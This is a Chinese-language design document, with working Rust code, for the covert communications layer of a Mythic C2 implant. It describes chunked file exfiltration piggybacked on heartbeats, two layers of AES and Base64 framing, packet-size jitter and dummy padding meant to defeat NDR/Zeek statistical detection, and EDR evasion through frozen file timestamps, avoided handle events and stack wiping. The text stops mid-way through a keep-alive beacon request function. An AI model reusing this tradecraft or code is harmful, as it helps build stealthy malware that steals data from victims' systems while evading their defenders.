# 设计目标

1. 纯栈流式切片
2. 实现动态大小，避免出现固定大小的流量特征-网络发包大小动态浮动
3. 随着每次心跳包发送数据，但又想将传输任务作为后台执行，不耽误其他心跳包接收服务端指令
4. 没有断点续传的容错性和 socket 卡死与进程死锁风险的解决方案
5. 大文件传输和 HTTP-Keep-Alive/Live 状态长连接网络传输调度器（尚未实现）。避免多次发送报文头.
6. 设计目标之间会有联系耦合,如一个设计目标可能在crypto.rs model.rs http.rs共同实现

**设计目标 2：http-live 模式，避免多次发送报文头**

使用tokio::net::TcpStream实现Keep-Alive

- 不要维持长连接 Stream POST（Chunked Transfer Encoding）。因为持续不关闭的 HTTP 请求会使套接字长期处于 `ESTABLISHED` 状态。
- 使用 HTTP Keep-Alive 复用 TCP 管道，但每次传输依然使用标准的短 HTTP POST 报文。这样既规避了频繁 TLS 握手的 CPU/时间开销，又符合正常 Web 浏览器的连接复用行为。
- 目前只有 profiles（即加密与序列化协议 Profile），缺失真正的网络 Socket / WinHTTP 传输循环。



**设计目标 4：随着每次心跳包发送数据，但传输任务作为后台执行，不耽误其他心跳包接收服务端指令**

- 未实现每次心跳自动 Seek 磁盘文件并交替发送的后台调度器（Task Scheduler）。
- Mythic 协议的设计天然支持 Piggybacking（顺风车复用）。代理 Agent 在每次心跳触发时，构造一个 `PostResponseMessage`（回执消息），这个消息内部包含一个数组：

```text
responses: &[TaskResponseItem]
```

其中包含：

- `TaskResponseItem 1`：GetTasking / 心跳查询（拉取操作员下发的新命令）。
- `TaskResponseItem 2`：`FileChunkPayload`（带上后台文件传输队列中当前读取的 1 片 4KB 动态数据）。

效果：

1. 零额外 HTTP 请求：传输任务完全搭上心跳包的“顺风车”，没有产生任何额外的 HTTP 连接。
2. 不耽误接收新指令：服务端在接收这一片文件的同时，回包依然会下发新的 C2 指令（如 `whoami`、`sleep`）。
3. 完美的离散化后台运行：Agent 内部维持一个简单的 `TaskQueue` 状态机，每次心跳只读 1 片，读完置零退出，主线程绝不阻塞，同时完美实现多任务并行。

- 每次心跳进行 `Open -> Seek -> Read -> Close` 存在以下红队隐患：
  - NTFS 访问时间戳更新（MFT Timestamp Drift）：频繁打开大文件进行 Read 会更新文件的 `LastAccessTime`，极易被 EDR 的文件系统过滤器驱动（Minifilter Driver，如 `fltmgr.sys`）通过 MFT 变更事件捕获。
  - 句柄打开 / 关闭事件（Handle Creation Thrashing）：高频打开 / 关闭敏感文件句柄会被 `Sysmon Event ID 11` 或 EDR 的 `ObRegisterCallbacks` 钩子记录。
- 优化方案：只读共享与时间戳冻结。在 `CreateFileW` 或 `std::fs::File::open` 时，必须显式指定：

```text
FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
```

并设置：

```text
FILE_FLAG_SEQUENTIAL_SCAN
```

- 内存映射只读视口（`VirtualAlloc` / `MapViewOfFile` + Memory Protection）替代常规 Read：对于特别敏感的大文件，可一次性建立 `PAGE_READONLY` 的 Section 映射，或者通过 `SetFileTime` 显式冻结 `LastAccessTime`，规避 MFT 时间戳漂移痕迹。

> 但是直接去掉异步，等大文件传输完毕不就解决这样的问题了吗？这样会导致心跳包不能执行其他指令的缺点外，还有其他劣势吗？（不能使用这种方式）

一次性发完大文件除了阻塞主线程外，还有其他严重劣势

1. 短时间的大量 HTTP POST 请求很容易被发现
2. 文件系统 IO 吞吐量峰值触发 EDR
3. while 循环中无休止地进行 Read -> AES 加密 -> Base64 编码 -> Socket Send，会导致当前 CPU 占用率飙升
4. 在离散心跳模式下：若发现蓝队开始抓包，操作员可以立即下发 sleep 86400（休眠一天）或 exit（自毁）


**综合**

当前方案结合 **“Piggybacking 顺风车复用 + 高斯动态分片 + 句柄即用即销 / 时间戳冻结 + 栈全量擦除”**，能够兼顾极致的 OPSEC 隐蔽性与长时传输的稳定性。

# 纯栈流式切片通信

1. 纯栈
2. 发送的数据包随机大小
3. 使用完毕一定使用core::ptr::write_volatile擦除痕迹

## Mythic客户端和服务端通信协议及尺寸选择

### 数据从客户端流向服务端的过程

1. 原始文件/命令输出 (Raw Read)
   │ 磁盘读取二进制字节流：2106 字节 (纯原生二进制)
   ▼
2. 应用层：内层 Base64 编码
   │ 将 2106B 二进制转成 ASCII 字符：2106 / 3 * 4 = 2808 字符
   ▼
3. 拼装第一层明文 JSON (Plaintext)。需要严格的 3 字节对齐读取（2106B / 36666B），绝对实现 0 填充符（无 = 或 ==）
   │ JSON 骨架 (action, task_id 等) 约 150B + chunk_data 2808B = 2958 字节
   │ 满足：2958B <= MAX_PLAINTEXT_LEN (2960B)
   ▼
4. 加密层：AES-256-CBC 原地填充与组帧
   │ PKCS#7 补齐 2 字节至 2960B 密文
   │ 组装物理帧：UUID(36B) + IV(16B) + 密文(2960B) + HMAC(32B) = 3044 字节
   │ 满足：3044B <= MAX_RAW_LEN (3072B)
   ▼
5. 传输层：外层 Base64 编码
   │ 将 3044B 二进制密文包整体转成 HTTP 传输文本：
   │ ceil(3044 / 3) * 4 = 4060 字符
   ▼
6. 最终网卡出网
   │ HTTP POST Body 携带 4060B 文本出网 (<= MAX_B64_LEN 4096B)

以上，其中有两层 base64。第二步的 base64 是因为 JSON 规范严禁包含任意原生二进制字节，因此 Mythic C2 规范要求所有二进制文件分片和命令回显，在塞入 JSON 前，必须在应用层做一次 base64 编码（如 `models.rs:321` 中 `pub chunk_data`）。

**内存暂存区结构**

存在于 Agent 进程内部的本地栈/堆缓存区，是二进制字节流（包含不可打印的字符）。UUID 是没有 AES 加密的明文（这里 UUID 不能 AES 加密，为了当数据包到达 Mythic 服务端时，用于识别哪个 Agent 发来的密文）。`padded_len` 是运行时变量，表示从目标文件截取的 chunk：

```text
[ UUID (36B) ] + [ IV (16B) ] + [ AES-256-CBC 密文 (padded_len=(data.len()/16 + 1) × 16) ] + [ HMAC-SHA256 (32B) ]
```

**网络传输层结构**

网卡发出的 HTTP POST 请求体，是纯 ASCII 文本（Base64 编码），UUID 被 Base64 编码：

```text
base64(| 明文 UUID (36B) | 随机 IV (16B) | AES-256-CBC 密文 (最大2976B=(2960/16 + 1) × 16 ) | HMAC-SHA256 (32B) | < 3072B 二进制密文帧 (MAX_RAW_LEN)|)
```

Base64 规定 3 字节输入生成 4 字节 ASCII。如果自定义切片常量为 N，那么 `base64 * 4/3 = N`。假设为 4KB（4096），最大原始数据大小为 3072。但是这里的 3072 不是明文，而是包含 AES 密文的数据包。Mythic C2 架构是双层 base64 编码，其结构如下：

- 外层固定协议头尾：UUID(36) + IV(16) + HMAC(32) = **84 字节**（3072 - 84 = 2988）
- 密文区必须 16B 对齐，取下限：`(2988 / 16) * 16 = 2976B`
- PKCS#7 最坏填充开销：**16 字节**：2976 - 16 = 2960B。保证任意 <= 2960B 的明文填充后 <= 2976B
- 应用层 JSON 结构体开销：JSON Overhead ≈ 150B（2960 - 150 = 2810B）
- Base64 4B 字符对齐（RFC 4648）：`(2810 / 4) * 4 = 2808 字符`
- Raw Read 3B 原始无填充对齐：`(2808 / 4) * 3 = 2106B`

零 Base64 填充，总包长 2958B <= 2960B（Base 尾部的 `=` 或 `==` 填充符若在高频心跳中频繁变动，容易成为特征异常。采用 3 字节对齐的原始读取（如 2106 / 2094）能保证生成的 base64 永远无 `=` / `==` 填充字符）。

**以上，在 4KB 切片环境下，最大原始待发送数据大小为 2106B**

- `MAX_RAW_READ`（磁盘/管道单次读取上限）= 2106B
- `MAX_PLAINTEXT_LEN`（第一层 JSON 明文上限）= 2960B
- `MAX_RAW_LEN`（二进制物理帧暂存区上限）= 3072B
- `MAX_B64_LEN`（网络发包输出缓冲区推荐）= 4096B

其计算公式为（利用 Rust 的 const 运算能力，在编译阶段自动求值，运行期零计算开销），是否有必要封装成一个函数（函数似乎没有必要），封装为一个常量计算式比较好。利用 `struct PacketBudget<const WIRE_SIZE: usize>` 将计算公式封装起来，公式只写一次，外部可通过指定数字直接生成对应的全套常量：

```rust
// ==================== 1. 协议核心公用常量 ====================
pub const UUID_LEN: usize = 36;
pub const IV_LEN: usize = 16;
pub const HMAC_LEN: usize = 32;
pub const AES_BLOCK_SIZE: usize = 16;
pub const PKCS7_WORST_PADDING: usize = 16;
pub const PROTOCOL_HEADER_LEN: usize = UUID_LEN + IV_LEN + HMAC_LEN; // 84B

// ==================== 2. 参数化协议预算模板 ====================
/// 协议缓冲区与切片预算计算器
///
/// * `WIRE_SIZE`: 网络出网目标报文总容量 (如 4KB: 4096, 64KB: 65536)
/// * `JSON_OVERHEAD`: 应用层 JSON 骨架开销预估 (默认 150B)
pub struct PacketBudget<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize = 150>;

impl<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize> PacketBudget<WIRE_SIZE, JSON_OVERHEAD> {
    // ----------------- 编译期内部断言 -----------------
    // 私有常量，在 MAX_RAW_LEN 初始化时强制绑定求值，确保零遗漏
    const _SANITY_CHECK: () = {
        assert!(WIRE_SIZE % 4 == 0, "WIRE_SIZE 必须能被 4 整除以满足 Base64 规范");
        assert!(
            WIRE_SIZE >= (PROTOCOL_HEADER_LEN + AES_BLOCK_SIZE + PKCS7_WORST_PADDING) * 4 / 3,
            "WIRE_SIZE 过小，无法容纳协议头与最小密文"
        );
        // 使用 saturating_sub 避免过小参数导致编译期减法溢出
        let raw_len = (WIRE_SIZE / 4) * 3;
        let cipher_len = (raw_len.saturating_sub(PROTOCOL_HEADER_LEN) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
        let plaintext_len = cipher_len.saturating_sub(PKCS7_WORST_PADDING);
        assert!(plaintext_len > JSON_OVERHEAD, "明文容量不足以容纳 JSON 骨架开销");
    };

    // ----------------- 公共导出常量 -----------------
    /// 网络 Base64 缓冲区推荐大小 (等于目标出网包预算)
    pub const MAX_B64_LEN: usize = WIRE_SIZE;

    /// 二进制物理帧暂存区上限 (Base64 解码后容量: Wire * 3 / 4)
    /// 巧妙将 _SANITY_CHECK 绑定在此处，任何代码只要接触此类，必在编译期执行检查
    pub const MAX_RAW_LEN: usize = {
        let () = Self::_SANITY_CHECK;
        (WIRE_SIZE / 4) * 3
    };

    /// 密文区 16 字节对齐的最大值 (采用 saturating_sub 防溢出)
    pub const MAX_CIPHERTEXT_LEN: usize =
        (Self::MAX_RAW_LEN.saturating_sub(PROTOCOL_HEADER_LEN) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;

    /// 第一层明文 JSON 的物理容量上限 (扣除 16B PKCS#7 保证加密后密文不溢出)
    pub const MAX_PLAINTEXT_LEN: usize =
        Self::MAX_CIPHERTEXT_LEN.saturating_sub(PKCS7_WORST_PADDING);

    /// JSON 中留给 Base64 编码的 4B 对齐字符容量
    pub const B64_ALIGNED_CAPACITY: usize =
        (Self::MAX_PLAINTEXT_LEN.saturating_sub(JSON_OVERHEAD) / 4) * 4;

    /// 磁盘/管道原始数据单次读取上限 (Raw Read: 严格 3 字节对齐，内层 Base64 绝无 '=' 填充)
    pub const MAX_RAW_READ: usize = (Self::B64_ALIGNED_CAPACITY / 4) * 3;
}

// ==================== 3. 常用工程规格预设 ====================
/// 常规心跳与轻量命令规格 (4KB 出网)
pub type Budget4K = PacketBudget<{ 4 * 1024 }>;

/// 中型回显与枚举规格 (16KB 出网)
pub type Budget16K = PacketBudget<{ 16 * 1024 }>;

/// 大文件传输与内存 Dump 分片规格 (64KB 出网)
pub type Budget64K = PacketBudget<{ 64 * 1024 }>;
```

| 规格 | MAX_B64_LEN | MAX_RAW_LEN | MAX_PLAINTEXT_LEN | MAX_RAW_READ (单次安全读取) | 内存承载方式建议 |
|---|---|---|---|---|---|
| Budget4K | 4096B | 3072B | 2960B | 2106B | 纯栈帧数组 `[u8; 3072]`，规避堆分配 |
| Budget16K | 16384B | 12288B | 12176B | 9018B | 栈帧数组或复用全局锁保护暂存区 |
| Budget64K | 65536B | 49152B | 49040B | 36666B | 专用静态暂存区（避免 48KB 栈溢出与 \_\_chkstk） |

**总结**

4060B 出网 ≤ 4096B。无任何环节溢出。

| 序号 | 验证项 | 状态 | 说明 |
|---|---|---|---|
| 1 | 全链路容量闭环 | ✅ 成立 | 4060B 出网 ≤ 4096B。无任何环节溢出。 |
| 2 | 3 字节对齐无填充 | ✅ 严格成立 | Budget4K (2106)、Budget16K (9018)、Budget64K (36666) 全部能被 3 整除，内层 Base64 绝无任何 `=` 或 `==` 填充字符。 |
| 3 | Rust 编译期求值 | ✅ 实机编译通过 | 在 rustc 1.94.0 环境下通过管道与单元测试验证，常量计算零运行期开销，类型定义与数组定长表现完美。 |

### 关于切片是4kb还是16/32/64kb大小

把包容量从 4KB 提升到 64KB 时，底层的攻防博弈环境会发生质的变化：

**1. 栈分配与 Stack Overflow / \_\_chkstk 陷阱**

- **4KB 模式**：`raw_buf: [u8; 3072]` 仅占约 3KB，放在栈帧上非常安全。
- **64KB 模式**：`raw_buf` 高达 49152B（约 48KB）。Windows 线程默认栈大小通常为 1MB。如果函数调用层级较深，或者在栈上直接定义 `[u8; 49152]`，MSVC/Rust 编译器会自动插入 `__chkstk` 探测函数以跨页探测分配（触碰 Guard Page）。

对抗启示：在 Windows 10/11 下，高频的栈探测容易暴露栈展开异常。64KB 模式建议使用专用的低频申请机制或静态全局加锁暂存区，并注意生命周期结束立即 `zeroize_slice`。

**2. 网络层 NDR/WAF 检测指纹变化**

- **4KB**：报文通常在一个或两个 TCP 分组内完成传输，流量行为极度接近常规网页 RESTful API 调用（如上传小型 JSON 元数据）。
- **64KB**：必然超越标准以太网 MTU（1500 字节），触发系统内核的 TCP 分段（TCP Segmentation Offload, TSO）。企业内网的 NDR（如 Corelight / Zeek）对 60KB+ 的大尺寸 HTTP POST 会标记为“大文件传输行为”，从而触发针对传输实体的独立沙箱解包与静态扫描。

在常规心跳下推荐保持 4KB，仅在执行文件上传/下载任务时动态切到 64KB。

**3. 大文件传输模式（64KB 堆暂存区）**

当执行 download 或 upload 任务时，在 Task 内部动态分配一个 64KB 的暂存区。传输结束后，立即调用 zeroize 并释放。

不要在整套协议中“全局唯一绑定 64KB”，而是采用动态多规格预算（Tiered Budget）——普通指令走 Budget4K，传输文件动态升轨至 Budget64K。

从 4KB 提升到 64KB 带来了 16 倍的系统调用削减；而从 64KB 再增加到 128KB，吞吐量提升通常小于 3%，边际收益极低。

# 网络发包大小动态浮动

栈缓冲区保上限，网络发包切片化。
Rust 的 const generics 定义的 WIRE_SIZE 仅作为栈上内存分配的最大安全边界（Zero Allocation Capacity），实际发送时绝不能直接全量发送整个定长缓冲区，而是发送有效切片：

```rust
// 错误做法：固定发送整个缓冲区大小
stream.write_all(&wire_buf).await?;

// 正确做法：只发送实际编码后的动态长度切片
use base64::engine::general_purpose::STANDARD;
use base64::Engine;

/// 将密文帧编码到固定大小的栈缓冲区，并返回有效切片
pub fn encode_to_slice<'a>(
    input: &[u8],
    wire_buf: &'a mut [u8],
) -> Result<&'a [u8], base64::EncodeSliceError> {
    // encode_slice 会将编码后的 ASCII 字节写入 wire_buf
    // 成功时返回实际写入的字节数量 written (usize)
    let written = STANDARD.encode_slice(input, wire_buf)?;

    // 直接截取有效切片返回
    Ok(&wire_buf[..written])
}
```

**实际调用示例（零堆分配）**

```rust
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let raw_payload = b"hello, secure protocol!";

    // 1. 栈上分配固定上限容量的缓冲区 (例如 4KB)
    let mut wire_buf = [0u8; 4096];

    // 2. 编码并获取实际长度切片
    let valid_slice = encode_to_slice(raw_payload, &mut wire_buf)?;

    // 3. 网络发送时只传递有效切片
    println!("总缓冲区大小: {} 字节", wire_buf.len());
    println!("实际发送大小: {} 字节", valid_slice.len());
    // stream.write_all(valid_slice).await?;

    Ok(())
}
```

这两者区别是什么？具体如何实现？

1. 返回值即长度：`STANDARD.encode_slice(src, dst)` 内部会计算 Base64 所需长度；若 dst 空间不足会返回 `EncodeSliceError::OutputSliceTooSmall`，若空间充足则直接完成写入并返回写入长度 written。
2. 零内存拷贝：`&wire_buf[..written]` 仅是一个带有长度标记的指针引用（胖指针 `&[u8]`），不发生任何堆内存分配或额外数据拷贝。

**动态随机分片读取（Raw Read Jitter）**

在传输文件或大体量回显数据时，每次不要死板读取 MAX_RAW_READ，而是在 `[MIN_RAW_READ, MAX_RAW_READ]` 之间动态取随机值。

> 注意：为遵循设计中“内层 Base64 无 = 填充”的约束，随机分片长度仍须严格对齐 3 字节。

```rust
use rand::Rng;

impl<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize> PacketBudget<WIRE_SIZE, JSON_OVERHEAD> {
    /// 动态获取读取下限（例如取最大容量的 70%，并向下保证 3 字节对齐）
    pub const fn min_raw_read() -> usize {
        let seventy_percent = (Self::MAX_RAW_READ * 7) / 10;
        (seventy_percent / 3) * 3
    }

    /// 计算带抖动的单次读取容量（兼顾大吞吐与防指纹特征）
    pub fn jittered_raw_read() -> usize {
        let min_read = Self::min_raw_read();
        let max_read = Self::MAX_RAW_READ;

        // 若规格极小导致下限与上限相等，则直接返回上限
        if min_read >= max_read {
            return max_read;
        }

        let mut rng = rand::thread_rng();
        // 在 [min_read, max_read] 范围内随机选择
        let raw_pick = rng.gen_range(min_read..=max_read);

        // 关键：向下取整到 3 的倍数，消除内层 Base64 '=' 填充
        (raw_pick / 3) * 3
    }
}
```

这么设计有点过于碎片了，将 MIN_RAW_READ 设为 1800 或者其他较大的值。上述代码取的是最大容量的 70%，并向下保证 3 字节对齐。

1. 以太网 MTU / TCP MSS 适配：
   - 标准以太网 MTU 通常为 1500 字节（MSS 约为 1460 字节）。
   - 当原始数据读入 1800 字节时，经过 AES 加密与外层 Base64 膨胀，出网报文大致在 2.5KB ∼ 3.5KB，TCP 会将其自然切分成 2~3 个 IP 报文。这种大小更符合常规大块 HTTP/RPC 响应的传输行为。
2. 流量指纹（NDR 方差分析）：
   - 即使把下限提高到 1800 字节（或 70% 比例），每次发送的数据包大小仍会在几百字节到几千字节的区间内随机摆动。
   - 这种摆动已足够破坏基于固定数据包大小（Fixed Packet Size）的静态特征检测，同时保证了高效的数据传输。

**应用层协议动态填充（Protocol Padding Jitter）**

再轻量级如心跳包中及其有必要。对于心跳、轻量交互命令等由于数据极短容易出现“小包大小固定”的场景，可在第一层 JSON 结构中加入动态伪装填充字段（Dummy Padding）：
在明文 JSON 结构体中添加随机内容字段：

```json
{
  "task_id": "9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d",
  "cmd": "whoami",
  "result": "...",
  "_p": "a8f09d8..." // 动态长度的随机垃圾数据
}
```

```rust
impl<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize> PacketBudget<WIRE_SIZE, JSON_OVERHEAD> {
    /// 动态计算当前 Payload 还允许塞入多少随机 Padding 字符
    ///
    /// * `current_plaintext_len`: 当前无 padding 时的实际 JSON 长度
    pub fn get_random_padding_len(current_plaintext_len: usize) -> usize {
        let max_pad = Self::MAX_PLAINTEXT_LEN.saturating_sub(current_plaintext_len);
        if max_pad <= 16 {
            return 0; // 空间紧凑，不填充
        }

        let mut rng = rand::thread_rng();
        // 随机在 [8, max_pad - 16] 间波动
        rng.gen_range(8..=(max_pad - 16))
    }
}
```

通过每次注入不同长度的 `_p` 字段，使明文 JSON 长度每次都不同；经过 PKCS#7 补齐及 Base64 编码后，最终网络层报文大小会自然呈现离散分布。

但需要注意：

1. JSON 中注入 `_p` 额外消耗的 7 个字节的固定值，如果不扣除这 7 字节，当空间按正好紧凑时，序列化后的明文极易溢出 MAX_PLAINTEXT_LEN。
2. 缺乏抖动上限控制（Jitter Cap）：在大规格预算（如 Budget64K，明文上限约 48KB）下，如果一个心跳包仅占 100 字节，原逻辑可能会随机生成一个 30KB ~ 40KB 的超大字符串作为 Padding。这不仅毫无必要地消耗 CPU 和网络带宽，而且行为特征极为异常。

**一、优化后的完整代码实现**

```rust
use rand::distributions::Alphanumeric;
use rand::Rng;
use serde::{Deserialize, Serialize};

// 引入常量
pub const AES_BLOCK_SIZE: usize = 16;
pub const PROTOCOL_HEADER_LEN: usize = 36 + 16 + 32; // 84B
pub const PKCS7_WORST_PADDING: usize = 16;

pub struct PacketBudget<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize = 150>;

impl<const WIRE_SIZE: usize, const JSON_OVERHEAD: usize> PacketBudget<WIRE_SIZE, JSON_OVERHEAD> {
    pub const MAX_RAW_LEN: usize = (WIRE_SIZE / 4) * 3;
    pub const MAX_CIPHERTEXT_LEN: usize =
        (Self::MAX_RAW_LEN.saturating_sub(PROTOCOL_HEADER_LEN) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
    pub const MAX_PLAINTEXT_LEN: usize =
        Self::MAX_CIPHERTEXT_LEN.saturating_sub(PKCS7_WORST_PADDING);

    /// JSON 注入 `,"_p":""` 所需的最小语法骨架字符数
    pub const PADDING_FIELD_OVERHEAD: usize = 7;

    /// 推荐的最大抖动上限（避免轻量心跳在 64KB 规格下被无意义塞满）
    pub const DEFAULT_MAX_JITTER: usize = 256;

    /// 计算允许填充的随机字符长度
    ///
    /// * `raw_json_len`: 未注入 padding 字段前的原始 JSON 字符串长度
    /// * `max_jitter`: 本次抖动的最大边界建议值（若传 None，则默认使用 DEFAULT_MAX_JITTER）
    pub fn get_random_padding_len(raw_json_len: usize, max_jitter: Option<usize>) -> usize {
        // 1. 扣除 JSON 语法开销，计算物理剩余可用容量
        let avail_space = Self::MAX_PLAINTEXT_LEN
            .saturating_sub(raw_json_len)
            .saturating_sub(Self::PADDING_FIELD_OVERHEAD);

        // 2. 保证至少有 8 字节填充空间，否则不作填充
        if avail_space < 8 {
            return 0;
        }

        // 3. 设定合理上限，防止小报文由于空间大而产生畸形开销
        let cap = max_jitter.unwrap_or(Self::DEFAULT_MAX_JITTER);
        let upper_bound = avail_space.min(cap);

        let mut rng = rand::thread_rng();
        rng.gen_range(8..=upper_bound)
    }

    /// 高效生成轻量随机 ASCII 伪装字符串
    pub fn generate_padding(len: usize) -> Option<String> {
        if len == 0 {
            return None;
        }
        let s: String = rand::thread_rng()
            .sample_iter(&Alphanumeric)
            .take(len)
            .map(char::from)
            .collect();
        Some(s)
    }
}
```

**二、业务层序列化结构体配合**

为了让填充字段在不需要时不占用任何带宽，在反序列化时能被自动忽略，配合 serde 属性设计如下：

```rust
#[derive(Serialize, Deserialize, Debug)]
pub struct MessagePayload<'a> {
    pub task_id: &'a str,
    pub cmd: &'a str,
    pub result: &'a str,

    /// 动态混淆字段：为 None 时完全不序列化到 JSON 中
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub _p: Option<String>,
}
```

**三、完整组装与使用示例**

```rust
type Budget4K = PacketBudget<{ 4 * 1024 }>;

fn prepare_dynamic_payload() -> Result<String, serde_json::Error> {
    // 1. 先准备好业务基础数据
    let mut payload = MessagePayload {
        task_id: "9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d",
        cmd: "whoami",
        result: "nt authority\\system",
        _p: None,
    };

    // 2. 预估基础 JSON 长度
    let base_json = serde_json::to_string(&payload)?;
    let base_len = base_json.len();

    // 3. 计算本轮安全的随机填充长度 (例如在 16 ~ 128 字节间浮动)
    let pad_len = Budget4K::get_random_padding_len(base_len, Some(128));

    // 4. 注入填充
    payload._p = Budget4K::generate_padding(pad_len);

    // 5. 产出最终明文 JSON (可保证绝不突破 Budget4K::MAX_PLAINTEXT_LEN)
    let final_json = serde_json::to_string(&payload)?;

    Ok(final_json)
}
```

1. 绝对内存安全：通过 saturating_sub 和 PADDING_FIELD_OVERHEAD 双重防线，消除了向 JSON 追加键值导致超出 MAX_PLAINTEXT_LEN 的可能。
2. 抖动幅度可控（Jitter Cap）：通过 max_jitter 参数将抖动范围控制在合理区间（例如 16B~256B），既打乱了网络数据包长，又不会因为无意义的垃圾数据挤占通信性能。
3. AES 块效应破坏：由于 PKCS#7 是以 16 字节为周期对齐的，当明文长度以 1 ∼ 128 字节随机摆动时，密文长度会在多个 16 字节块之间离散分布，外层 Base64 编码后的最终网络出网字节数将呈现自然的变化区间，彻底消除静态包长特征。

不会破坏之前计算的 json 结构体消耗的 150B 大小，因为两者在协议设计中处于两个完全互斥的场景。

**JSON_OVERHEAD 的真正作用**

回顾原始代码中的计算链条：

```rust
pub const B64_ALIGNED_CAPACITY: usize =
    (Self::MAX_PLAINTEXT_LEN.saturating_sub(JSON_OVERHEAD) / 4) * 4;

pub const MAX_RAW_READ: usize = (Self::B64_ALIGNED_CAPACITY / 4) * 3;
```

可以看到，JSON_OVERHEAD = 150B 唯一的作用是：

> 在传输大文件或满载数据（Raw Read）时，预先为应用层 JSON 结构（如 `{"task_id":"...","op":"...","data":"..."}`）预留出 150 字节的固定安全槽位，防止内层 Base64 数据把空间全占满导致加密溢出。

**1. 为什么动态填充 \_p 绝不会破坏它？**

你的协议在运行时严格划分为两个互斥的通信模式：

场景 A：满载数据 / 大分片传输模式（大包）

- 特征：正在传输大文件或内存 Dump，有效载荷接近物理上限。
- 行为：此时依靠 jittered_raw_read() 动态控制分片大小，根本不需要也不应该填充 \_p。
- 表现：结构体中的 \_p 为 None。由于配置了 `#[serde(skip_serializing_if = "Option::is_none")]`，序列化后的 JSON 中完全不存在 \_p 这个键名与内容。
- 结论：JSON 骨架开销依然严格受控在预留的 150 字节以内，MAX_RAW_READ 预算安全无虞。

场景 B：心跳 / 短命令回显模式（小包）

- 特征：数据量极小（例如只是心跳 `{"status":"ok"}`），整个 JSON 明文可能才 60~100 字节，远低于 MAX_PLAINTEXT_LEN（例如在 4KB 规格下明文上限约为 2960 字节）。
- 行为：此时并不存在大容量的 MAX_RAW_READ 载荷，空间有大量富余（还剩 2800+ 字节空闲）。
- 表现：get_random_padding_len 的计算锚点是 MAX_PLAINTEXT_LEN（明文总上限），而不是 JSON_OVERHEAD。它只是把这些原本闲置未用的空闲空间，动态吃掉几十到几百字节。
- 结论：虽然 JSON 骨架因为塞了 \_p 变大了，但总长度仍然远远低于 MAX_PLAINTEXT_LEN，绝不会发生缓冲区溢出。

**2. 代码级的自适应熔断防护（防呆设计）**

优化后的 get_random_padding_len 具备自适应防御能力：

```rust
let avail_space = Self::MAX_PLAINTEXT_LEN
    .saturating_sub(raw_json_len)
    .saturating_sub(Self::PADDING_FIELD_OVERHEAD);

if avail_space < 8 {
    return 0; // 空间紧凑时，自动归零！
}
```

假设在极度满载的情况下（比如读入了最大的数据块，导致 raw_json_len 已经非常接近 MAX_PLAINTEXT_LEN），avail_space 会瞬间收缩甚至变为 0，该函数会直接返回 0，\_p 保持为 None，绝不会强行塞入填充导致包体溢出。

**传输桶离散化（Multi-Bucket Morphing）**

如果由于 C2 架构需要统一管理缓冲区，不要单一硬编码 Budget4K，可采用多档位离散桶 + 桶内抖动：

```rust
pub enum DynamicBudget {
    Small(Budget4K),
    Medium(Budget16K),
    Large(Budget64K),
}

impl DynamicBudget {
    /// 根据待发载荷大小和隐蔽策略，动态选择规格
    pub fn select(required_raw_len: usize) -> usize {
        if required_raw_len <= Budget4K::MAX_RAW_READ {
            // 即使是 4K 桶，也可以人为混淆选择 16K 桶发送（加冗余 Padding）
            // 破坏基于数据量反推操作类型的流量特征
            Budget4K::jittered_raw_read()
        } else if required_raw_len <= Budget16K::MAX_RAW_READ {
            Budget16K::jittered_raw_read()
        } else {
            Budget64K::jittered_raw_read()
        }
    }
}
```

**防御与对抗总结（Windows 10/11 & EDR/NDR 视角）**

| 对抗维度 | 原始方案特征 | 引入动态抖动后特征 | 对抗增益 |
|---|---|---|---|
| NDR 包长直方图 | 尖锐脉冲（包长仅集中在 4096B） | 离散正态分布 / 均匀分布 | 规避 Zeek/Suricata 的 Beacon 统计聚合与周期性方差检测 |
| TCP 窗口与 PSH 分段 | 固定的 MTU 分段边界 | 随机 MTU/MSS 分段形态 | 破坏网络全流量抓包（PCAP）的特征匹配规则 |
| EDR Winsock 监控 | 单次 WSASend/send 长度固定 | 每次系统调用缓冲区长度浮动 | 绕过依赖固定 Buffer Size 的启发式 API Monitor / Inline Hooking |

# 基于纯 tokio::net::TcpStream的HTTP Keep-Alive 复用 TCP 管道 + 短 HTTP POST报文

这个方案在红队隐蔽通信（C2 Beaconing /
  Exfiltration）以及高性能微服务中非常经典。
  你需要区分清楚两个层级：
  • L4（TCP Keep-Alive）：内核协议栈在连接空闲时发送无负载探测包，防止 NAT
  表老化。
  • L7（HTTP Keep-Alive / Persistent Connection）：应用层复用同一个 TCP
  管道传输多次 HTTP 交互，避免反复进行 TCP 握手/挥手（以及 TLS 握手）。
  在 Tokio
  下实现这个方案，常见有两种途径：轻量级手工拼包（体积小、无额外重依赖，适合
  免杀 Payload） 与 借助 hyper（稳健、工业级解析）。
  ──────
  ### 一、 方案实现：基于纯 tokio::net::TcpStream
  在红队 Payload（如
  Dropper/Stager）中，为了将体积压缩到极致并去除特征库，通常直接基于纯
  TcpStream 实现。
  核心逻辑：
  1. 发送 HTTP/1.1 请求头，声明 Connection: keep-alive。
  2. POST 报文必须明确指定 Content-Length。
  3. 关键点：接收端必须完整读取服务端返回的 Header 和指定的 Content-Length
  Payload，确保 TCP 读缓冲区干净，才能进入下一次 POST。
    use std::time::Duration;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpStream;
    use tokio::time::sleep;

    async fn post_beacon(
        stream: &mut TcpStream,
        host: &str,
        path: &str,
        data: &[u8],
    ) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        // 1. 构造短 HTTP POST 报文（HTTP/1.1 默认即为 Keep-Alive）
        let req_header = format!(
            "POST {} HTTP/1.1\r\n\
            Host: {}\r\n\
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
            Content-Type: application/octet-stream\r\n\
            Content-Length: {}\r\n\
